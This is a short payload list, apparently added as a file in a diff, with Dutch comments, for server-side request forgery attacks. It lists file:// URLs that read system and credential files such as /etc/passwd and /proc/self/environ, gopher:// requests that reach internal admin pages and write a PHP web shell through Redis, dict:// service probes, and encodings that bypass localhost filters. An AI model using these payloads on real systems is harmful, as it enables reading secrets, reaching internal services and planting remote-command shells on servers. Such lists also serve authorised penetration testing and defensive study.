@@ -1,0 +1,28 @@
+# SSRF - Alternative URL Schemes / Protocollen
+# === file:// - Lokale bestanden lezen ===
+file:///etc/passwd
+file:///etc/hostname
+file:///proc/self/environ
+file:///var/www/html/config.php
+file:///C:/windows/win.ini
+# === gopher:// - Arbitrary TCP requests craftten ===
+# Let op: eerste char van path wordt afgeknipt, gebruik _ prefix
+# HTTP GET via gopher:
+gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
+# HTTP POST via gopher:
+gopher://127.0.0.1:80/_POST%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2013%0d%0a%0d%0acmd=id
+# Redis via gopher:
+gopher://127.0.0.1:6379/_SET%20shell%20%22<%3fphp%20system($_GET['cmd'])%3b%20%3f>%22%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSAVE%0d%0a
+# === dict:// - Service banner grabbing ===
+dict://127.0.0.1:6379/INFO
+dict://127.0.0.1:11211/stats
+# === Localhost bypass ===
+http://127.0.0.1
+http://0.0.0.0
+http://[::1]
+http://0177.0.0.1 (octal)
+http://2130706433 (decimal)
+http://0x7f000001 (hex)
+http://127.1
+http://localtest.me
+# Tip: Gopher is het krachtigst - hiermee kun je elk TCP protocol aanspreken
